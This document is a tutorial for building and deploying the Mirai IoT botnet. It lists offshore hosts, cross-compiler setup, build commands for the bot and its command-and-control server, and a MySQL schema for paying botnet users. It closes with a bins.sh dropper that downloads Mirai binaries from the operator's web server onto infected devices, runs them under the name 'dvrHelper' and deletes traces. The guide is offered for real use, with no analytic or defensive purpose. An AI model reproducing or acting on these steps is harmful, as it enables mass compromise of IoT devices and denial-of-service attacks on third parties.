
███╗   ███╗██╗██████╗  █████╗ ██╗    ██████╗  ██████╗ ████████╗███╗   ██╗███████╗████████╗
████╗ ████║██║██╔══██╗██╔══██╗██║    ██╔══██╗██╔═══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝
██╔████╔██║██║██████╔╝███████║██║    ██████╔╝██║   ██║   ██║   ██╔██╗ ██║█████╗     ██║   
██║╚██╔╝██║██║██╔══██╗██╔══██║██║    ██╔══██╗██║   ██║   ██║   ██║╚██╗██║██╔══╝     ██║   
██║ ╚═╝ ██║██║██║  ██║██║  ██║██║    ██████╔╝╚██████╔╝   ██║   ██║ ╚████║███████╗   ██║   
╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝    ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝   

              ████████╗██╗   ██╗████████╗ ██████╗ ██████╗ ██╗ █████╗ ██╗     
              ╚══██╔══╝██║   ██║╚══██╔══╝██╔═══██╗██╔══██╗██║██╔══██╗██║     
                 ██║   ██║   ██║   ██║   ██║   ██║██████╔╝██║███████║██║     
                 ██║   ██║   ██║   ██║   ██║   ██║██╔══██╗██║██╔══██║██║     
                 ██║   ╚██████╔╝   ██║   ╚██████╔╝██║  ██║██║██║  ██║███████╗
                 ╚═╝    ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
                                                                                                                          
                                   By - Jihadi4Potus
                                       Boatnet.us
                    Refrence: https://www.youtube.com/watch?v=G4vUp3ydjs0

* REQUIREMENTS *
- 2x Debian 8 Offshore boxes - Providers. [x0]
- Mirai Source - https://github.com/jgamblin/Mirai-Source-Code 
- Good Instruction following skillz.

[x0] Hosting Providers.
https://www.nforce.com/
http://www.novogara.com/
https://www.dataclub.biz/ (Accepts Everything but Paypal.)

;This is a fully tutorial how to setup mirai from scratch. ENJOY :)
;This fixes golang errors when ./build debug telnet , is executed.

[x01] Installation
 apt-get update 
 apt-get upgrade
 apt-get install gcc golang electric-fence git mysql-client mysql-server
 git clone https://github.com/jgamblin/Mirai-Source-Code

[x02] Installing and compiling the cross-compilers-
;If you run build.sh in /mirai folder you will get an error for armv6l, In the main tutorial this wasn't included so I added it to make life easier.

 mkdir /etc/xcompile
 cd /etc/xcompile
 
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
 wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
 
 tar -jxf cross-compiler-armv4l.tar.bz2
 tar -jxf cross-compiler-i586.tar.bz2
 tar -jxf cross-compiler-m68k.tar.bz2
 tar -jxf cross-compiler-mips.tar.bz2
 tar -jxf cross-compiler-mipsel.tar.bz2
 tar -jxf cross-compiler-powerpc.tar.bz2
 tar -jxf cross-compiler-sh4.tar.bz2
 tar -jxf cross-compiler-sparc.tar.bz2
 tar -jxf cross-compiler-armv6l.tar.bz2
 
 rm *.tar.bz2
 mv cross-compiler-armv4l armv4l
 mv cross-compiler-i586 i586
 mv cross-compiler-m68k m68k
 mv cross-compiler-mips mips
 mv cross-compiler-mipsel mipsel
 mv cross-compiler-powerpc powerpc
 mv cross-compiler-sh4 sh4
 mv cross-compiler-sparc sparc
 mv cross-compiler-armv6l armv6l
	
[x03] Adding GoLang paths.
;Execute these in your ssh terminal, this will add to your ~/.bashrc
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin

export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/Documents/go

[x04] Fixing errors.
./build.sh debug telnet
;Once you execute this in the main mirai directory ./Mirai-Source-Code/mirai, If you did this command before step 2 & 3 you would get an error about the Mysql and sql-drivers, since that's what alot of people have had trouble with. This fixes that.
 go get github.com/go-sql-driver/mysql
 go get github.com/mattn/go-shellwords


[x05] Obfuscated string

;make sure you are in the Mirai-Source-Code/mirai folder,
./debug/enc string {Domain.com} 
;Now add this to your table.c (mirai/bot/) file. 



[x06] Database setup
;Now where going to setup the database permissions and users.
;If you have iptbales/ip6tables or any firewall install disable it.

service iptables stop
/etc/ini.d/iptbales stop
/usr/bin/mysql_secure_installation
;It will ask you to set a password, make sure you remember this.

;Database setup
;Edit your main.go in /cnc/
ex: 120.0.0.1:3306
;Once you've done the step above were going to add the database and user perms. follow this link.
;Open mysql.
mysql -u root -p
;Create the database first
create database mirai;
;Next select the database
use mirai
;Copy and paste this into your terminal. 
 
CREATE TABLE `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);
 
CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);
 
CREATE TABLE `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);

;set the user Values.

INSERT INTO users VALUES (NULL, 'username', 'password', 0, 0, 0, 0, -1, 1, 30, '');

;Set the credentials you used in the ./cnc/main.go file. 
;Now your server should be online
service mysql restart

./build.sh debug telnet
./build.sh release telnet
;Now your going to have to move the prompt.txt file in mirai main directory into the release folder
;go to your debug folder ./mirai/release you will seen a compiled file named cnc execute it.
./cnc
;Now you can login through your ssh client with telnet.

;install apache2
apt-get install apache2

service apache2 start

;move the mirai-files to the apache2 webserver, for example: /var/www/html
mv mirai.* /var/www/html (for example)
;create bins.sh and move it also to the webservers folder.

#!/bin/sh

#edit
WEBSERRVER="edit your ip"

#stop editing
BINARIES="mirai.arm mirai.m68k mirai.mips mirai.mpsl mirai.ppc mirai.sh4 mirai.x86 mirai.spc"

for Binary in $BINARIES; do 
	wget http://$WEBSERVER/$Binary -O dvrHelper
	chmod 777 dvrHelper
	./dvrHelper
done

rm -f *

;add the file to your webserver and restart apache2.
service apache2 restart


